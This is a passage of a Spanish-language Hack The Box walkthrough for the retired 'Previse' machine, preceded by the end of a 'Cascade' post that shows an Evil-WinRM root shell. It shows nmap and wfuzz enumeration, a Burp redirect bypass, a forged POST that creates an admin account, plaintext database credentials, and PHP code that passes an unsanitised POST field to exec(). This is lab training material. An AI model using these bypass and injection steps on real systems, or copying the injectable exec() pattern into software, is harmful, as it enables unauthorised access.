Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;Desktop/root.txt
12909612d25c8xxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Rooteada y concepto sobre el Grupo Azure Admins aprendido. K0H4ck =)&lt;/p&gt;</content><author><name>K0Hack</name></author><category term="HTB," /><category term="LDAP," /><category term="RPCCLIENT," /><category term="ASREPRoast" /><category term="Attack," /><category term="Crackmapexec," /><category term="Azure" /><category term="Admins" /><category term="Group," /><category term="Privesc" /><category term="Azure" /><category term="Admins," /><category term="Evil-WinRm," /><category term="Maquinas" /><category term="Retiradas" /><summary type="html">Cascade - AD Path ~ Hack The Box</summary></entry><entry><title type="html">Maquina Retirada Previse de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/01/10/Previse.html" rel="alternate" type="text/html" title="Maquina Retirada Previse de Hack The Box (Necesario VIP)" /><published>2022-01-10T00:00:00-03:00</published><updated>2022-01-10T00:00:00-03:00</updated><id>http://localhost:4000/2022/01/10/Previse</id><content type="html" xml:base="http://localhost:4000/2022/01/10/Previse.html">&lt;h1 id=&quot;previse--hack-the-box&quot;&gt;Previse ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.10.125       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;span class=&quot;c&quot;&gt;#nmap 7.91 scan initiated Fri Oct 29 10:31:39 2021 as: nmap --script http-enum -p80 -oN WebScan 10.10.11.104&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.104
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.044s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lanzamos el Script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http-enum&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /css/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;&apos;apache/2.4.29 (ubuntu)&apos;&lt;/span&gt;
|_  /js/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;&apos;apache/2.4.29 (ubuntu)&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Lanzamos la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Whatweb&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap done at Fri Oct 29 10:31:48 2021 -- 1 IP address (1 host up) scanned in 9.17 seconds&lt;/span&gt;
http://10.10.11.104:80 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.11.104], Meta-Author[m4lwhere], RedirectLocation[login.php], Script, Title[Previse Home]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Fuzzeamos por posibles archivos a nivel &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Target: http://10.10.11.104/FUZZ.php
Total requests: 220548

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000000187:   200        31 L     60 W       1248 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;nav&quot;&lt;/span&gt;                                                                                                                                             
000000320:   200        5 L      14 W       217 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;footer&quot;&lt;/span&gt;                                                                                                                                          
000000004:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;download&quot;&lt;/span&gt;                                                                                                                                        
000000002:   302        71 L     164 W      2801 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;index&quot;&lt;/span&gt;                                                                                                                                           
000000081:   302        112 L    263 W      4914 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;files&quot;&lt;/span&gt;                                                                                                                                           
000000751:   302        74 L     176 W      2966 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;                                                                                                                                          
000000040:   200        53 L     138 W      2224 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;login&quot;&lt;/span&gt;                                                                                                                                           
000001212:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;logout&quot;&lt;/span&gt;                                                                                                                                          
000001376:   302        93 L     238 W      3994 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;accounts&quot;&lt;/span&gt;                                                                                                                                        
000001477:   200        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;config&quot;&lt;/span&gt;                                                                                                                                          
000002258:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;                                                                                                                                            
000000178:   200        20 L     64 W       980 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;header&quot;&lt;/span&gt;                                                                                                                                          
000045227:   403        9 L      28 W       277 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.11.104/.php&quot;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que encontramos un 302 para recursos a nivel web, procedemos a usar Burpsuite para modificar la respuesta del Servidor de
302 a 200 OK&lt;/p&gt;

&lt;p&gt;Probamos con el recurso encontrado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accounts.php&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Cambiamos la cabecera 302 Not Found &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 200 OK desde Burpsuite 
Inteceptando la respuesta del Servidor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Venmos que conseguimos entrar al recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accounts.php&lt;/code&gt; saltandonos el panel login.
Procemos a crear un usuario llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /accounts.php HTTP/1.1

Host: 10.10.11.104
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:78.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5
Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/accounts.php
Cookie: &lt;span class=&quot;nv&quot;&gt;PHPSESSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;p79kvpmandld75npavcn0cra88
Upgrade-Insecure-Requests: 1

&lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin&amp;amp;confirm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin&amp;amp;submit&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a salirnos al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt; inicial e intentar conectarnos como el usuario que hemos creado
Vemos que accedemos correctamente&lt;/p&gt;

&lt;p&gt;Encontramos el siguiente Menu&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HOME ACCOUNTS FILES MANAGEMENT MENU ADMIN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;En &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILES&lt;/code&gt;  encontramos un archivito –&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SiteBackup.zip&lt;/code&gt; –&amp;gt; Procedemos a descargarnoslo a nuestra maquina atacante&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 7z x siteBackup.zip             &lt;/span&gt;

7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;es_ES.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,8 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i7-8700K CPU @ 3.70GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;906EA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM,AES-NI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
1 file, 9948 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extracting archive: siteBackup.zip
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; siteBackup.zip
Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 9948

Everything is Ok

Files: 13
Size:       24047
Compressed: 9948
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos los diferentes recursos que encontramos a nivel del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SiteBackup.zip&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# tree                                  &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
├── accounts.php
├── config.php
├── download.php
├── file_logs.php
├── files.php
├── footer.php
├── header.php
├── index.php
├── login.php
├── logout.php
├── logs.php
├── nav.php
├── siteBackup.zip
└── status.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos Credenciales en Texto Claro&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat config.php                             
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connectDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;localhost&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;mySQL_p@ssw0rd!:)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;previse&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$mycon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;mysqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mycon&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a seguir inspeccionando la web y sus menus. Nos dirigimos al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MANAGEMENT MENU&lt;/code&gt; que tiene Dos SubMenus
WebSite Status  – Log Data&lt;/p&gt;

&lt;p&gt;Procedemos a interceptar con burpsuite una peticion del Submenu – &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Log Data&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /file_logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:78.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5
Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
Referer: http://10.10.11.104/status.php
Connection: close
Cookie: &lt;span class=&quot;nv&quot;&gt;PHPSESSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;p79kvpmandld75npavcn0cra88
Upgrade-Insecure-Requests: 1
Cache-Control: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que se produce un GET a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_logs.php&lt;/code&gt; pero tambien vemos que tenemos un Botton para ejecutar una accion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;comma&lt;/code&gt;
Vemos que la peticion interceptada con Burpsuite para el recurso via Post &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logs.php&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /logs.php HTTP/1.1

Host: 10.10.11.104
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:78.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5
Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: &lt;span class=&quot;nv&quot;&gt;PHPSESSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;p79kvpmandld75npavcn0cra88
Upgrade-Insecure-Requests: 1

&lt;span class=&quot;nv&quot;&gt;delim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;comma
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inspeccionemos el codigo fuente de este Recurso ya que vemos que en la respuesta parace que se estan ejecutando algun tipo de comando a nivel de sistema&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat logs.php  
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Location: login.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REQUEST_METHOD&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;POST&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Location: login.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;/////////////////////////////////////////////////////////////////////////////////////&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;/////////////////////////////////////////////////////////////////////////////////////&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/usr/bin/python /opt/scripts/log_process.py &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;delim&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$filepath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/out.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;out.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    

